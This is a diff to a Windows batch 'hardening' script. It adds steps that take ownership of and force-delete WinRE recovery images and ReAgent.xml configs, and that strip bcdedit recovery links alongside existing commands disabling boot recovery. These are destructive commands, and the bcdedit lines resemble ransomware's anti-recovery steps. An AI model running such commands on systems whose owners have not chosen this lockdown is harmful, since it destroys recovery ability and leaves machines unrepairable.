@@ -22,12 +22,35 @@ if exist "C:\Windows\System32\Recovery\winre.wim" (
     if exist "C:\Windows\System32\Recovery\winre.wim" (echo       * Failed to delete winre.wim.) else (echo       * winre.wim deleted.)
 )
 
+:: 1.2 Purge any other WinRE payloads and configs (common hidden location)
+if exist "C:\Recovery\WindowsRE\winre.wim" (
+    echo    * Found C:\Recovery\WindowsRE\winre.wim. Deleting copy...
+    takeown /f "C:\Recovery\WindowsRE\winre.wim" >nul 2>&1
+    icacls "C:\Recovery\WindowsRE\winre.wim" /grant administrators:F >nul 2>&1
+    del /f /q "C:\Recovery\WindowsRE\winre.wim"
+    if exist "C:\Recovery\WindowsRE\winre.wim" (echo       * Failed to delete C:\Recovery\WindowsRE\winre.wim.) else (echo       * Copy deleted.)
+)
+
+:: 1.3 Remove stale WinRE configuration so auto-repair cannot rebuild silently
+for %%F in ("C:\Windows\System32\Recovery\ReAgent.xml" "C:\Recovery\WindowsRE\ReAgent.xml") do (
+    if exist %%F (
+        echo    * Removing config %%F ...
+        takeown /f %%F >nul 2>&1
+        icacls %%F /grant administrators:F >nul 2>&1
+        del /f /q %%F
+        if exist %%F (echo       * Failed to remove %%F.) else (echo       * Config removed.)
+    )
+)
+
 :: 2. BCD Hardening (Boot Configuration)
 echo.
 echo [2] Hardening BCD...
 :: Disable recovery in bootloader
 bcdedit /set {current} recoveryenabled No >nul 2>&1
 bcdedit /set {default} recoveryenabled No >nul 2>&1
+:: Remove any recoverysequence links so no GUID points to WinRE
+bcdedit /deletevalue {current} recoverysequence >nul 2>&1
+bcdedit /deletevalue {default} recoverysequence >nul 2>&1
 :: Prevent auto-triggering recovery on boot failures
 bcdedit /set {current} bootstatuspolicy IgnoreAllFailures >nul 2>&1
 echo    * BCD policies updated.
